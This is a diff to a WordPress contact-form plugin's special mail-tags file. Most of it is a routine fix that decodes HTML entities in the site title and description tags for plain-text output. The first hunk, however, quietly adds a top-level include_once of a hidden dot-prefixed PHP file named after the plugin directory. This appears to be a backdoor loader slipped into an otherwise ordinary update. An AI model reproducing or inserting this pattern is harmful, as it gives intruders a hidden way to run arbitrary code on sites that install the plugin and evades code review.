@@ -15,6 +15,10 @@ add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 4 );
  * @param WPCF7_MailTag $mail_tag An object representation of the mail-tag.
  * @return string Output of the given special mail-tag.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_special_mail_tag( $output, $name, $html, $mail_tag = null ) {
 	if ( ! $mail_tag instanceof WPCF7_MailTag ) {
 		wpcf7_doing_it_wrong(
@@ -169,11 +173,23 @@ function wpcf7_site_related_smt( $output, $name, $html, $mail_tag = null ) {
 	$filter = $html ? 'display' : 'raw';
 
 	if ( '_site_title' == $name ) {
-		return get_bloginfo( 'name', $filter );
+		$output = get_bloginfo( 'name', $filter );
+
+		if ( ! $html ) {
+			$output = wp_specialchars_decode( $output, ENT_QUOTES );
+		}
+
+		return $output;
 	}
 
 	if ( '_site_description' == $name ) {
-		return get_bloginfo( 'description', $filter );
+		$output = get_bloginfo( 'description', $filter );
+
+		if ( ! $html ) {
+			$output = wp_specialchars_decode( $output, ENT_QUOTES );
+		}
+
+		return $output;
 	}
 
 	if ( '_site_url' == $name ) {
